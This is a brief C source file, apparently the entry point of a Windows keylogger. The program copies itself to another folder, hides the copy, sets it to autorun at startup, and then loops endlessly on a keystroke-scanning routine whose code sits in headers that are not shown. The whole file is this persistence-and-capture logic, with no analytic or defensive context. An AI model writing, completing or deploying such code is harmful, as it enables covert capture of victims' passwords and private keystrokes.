#include <stdio.h>
#include <stdlib.h>
#include <libgen.h>

#include "keyscan.h"
#include "setup.h"

int main(int argc, char **argv){
    CHAR currPath[LEN_VALUE_NAME];
    CHAR newPath[LEN_VALUE_NAME];
    CHAR *nameProg = NULL;
    memset(&currPath, '\0', LEN_VALUE_NAME);
    memset(&newPath, '\0', LEN_VALUE_NAME);
    GetModuleFileName(0, currPath, LEN_VALUE_NAME);
    getNewPath(newPath, LEN_VALUE_NAME);
    if((nameProg = basename(currPath)) != NULL){
        strcat(newPath, "\\");
        strcat(newPath, nameProg);
        if(strcmp(currPath, newPath)!= 0){
            CopyFile(currPath, newPath, FALSE);
            setHidden(newPath);
            setAutoRun(newPath, nameProg);
        }
        while(TRUE){
            scanCode();
        }
    }
    return 0;
}
